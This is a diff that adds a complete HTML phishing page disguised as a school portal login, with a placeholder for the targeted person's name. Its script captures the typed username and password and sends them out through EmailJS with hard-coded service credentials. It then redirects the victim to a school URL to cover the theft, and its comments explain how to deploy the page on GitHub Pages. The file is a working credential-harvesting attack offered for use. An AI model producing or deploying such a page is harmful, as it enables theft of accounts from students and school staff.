@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>School Portal - Secure Login</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .login-header h1 {
+            color: #333;
+            font-size: 28px;
+            margin: 0;
+        }
+        .login-header p {
+            color: #666;
+            font-size: 14px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 5px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus {
+            border-color: #2a5298;
+            outline: none;
+        }
+        .form-submit {
+            width: 100%;
+            padding: 12px;
+            background: #2a5298;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .form-submit:hover {
+            background: #1e3c72;
+        }
+        .footer-text {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+        .loader {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #2a5298;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <h1>School Portal Login</h1>
+            <p>Welcome back, [Target Person’s Name]! Please enter your credentials.</p>
+        </div>
+        <form id="loginForm" onsubmit="sendEmail(event)">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="form-submit" id="submitBtn">Log In</button>
+            <div class="loader" id="loader"></div>
+        </form>
+        <div class="footer-text">
+            © 2025 School District | Secure Access
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            emailjs.init('mgsE9ce6Tke2ieolO'); // Your EmailJS Public Key
+        })();
+
+        function sendEmail(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const loader = document.getElementById('loader');
+
+            submitBtn.style.display = 'none';
+            loader.style.display = 'block';
+
+            // Local testing mode
+            if (window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost') {
+                console.log('Local Test - Username:', username, 'Password:', password);
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    submitBtn.style.display = 'block';
+                    alert('Local test complete! Data logged to console. Deploy to GitHub Pages to send email.');
+                }, 1000);
+            } 
+            // Live mode for GitHub Pages
+            else {
+                emailjs.send('service_6mczk2e', 'template_adbt0um', {
+                    username: username,
+                    password: password
+                })
+                .then(() => {
+                    setTimeout(() => {
+                        window.location.href = 'https://example.com'; // Replace with your school's URL
+                    }, 1000);
+                }, (error) => {
+                    console.log('Email failed:', error);
+                    alert('Login failed: ' + error.text);
+                    loader.style.display = 'none';
+                    submitBtn.style.display = 'block';
+                });
+            }
+        }
+    </script>
+</body>
+</html>
